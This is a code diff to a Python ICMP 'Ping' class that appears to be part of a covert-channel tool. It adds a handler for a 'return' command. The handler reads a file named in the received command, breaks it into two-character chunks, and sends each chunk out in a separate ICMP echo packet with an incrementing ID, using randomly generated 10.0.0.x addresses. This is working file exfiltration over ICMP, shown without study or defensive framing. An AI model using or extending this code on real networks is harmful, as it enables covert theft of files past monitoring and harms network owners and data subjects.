@@ -164,7 +164,7 @@ class Ping(object):
         return ['10.0.0.' + str(h1), '10.0.0.' + str(h2)]
 
     # send an ICMP ECHO_REQUEST packet
-    def send_one_ping(self, current_socket, data):
+    def send_one_ping(self, current_socket, data, id=0x03):
 
         # Create a new IP packet and set its source and destination IP addresses
         src, dst = self.generate_two_random_ips()
@@ -184,7 +184,7 @@ class Ping(object):
         ip.contains(icmp)
 
         # give the ICMP packet some ID
-        icmp.set_icmp_id(0x03)
+        icmp.set_icmp_id(id)
         # TODO: Set when multiple packets are needed for sending a file
 
         # set the ICMP packet checksum
@@ -213,6 +213,12 @@ class Ping(object):
         elif cmd == 'return':
             print("Receive Data")
             self.send_one_ping(self.socket, self.create_return_message(data[1]))
+            with open(data[1],'r') as f:
+                lines = f.read()
+            tmp = list(map(''.join, zip(*[iter(lines)]*2)))
+            for i in range(len(tmp)):
+                print tmp[i]
+                self.send_one_ping(self.socket, tmp[i], i+1)
 
     def process_socket_reply(self):
         packet_data, address = self.socket.recvfrom(ICMP_MAX_RECV)
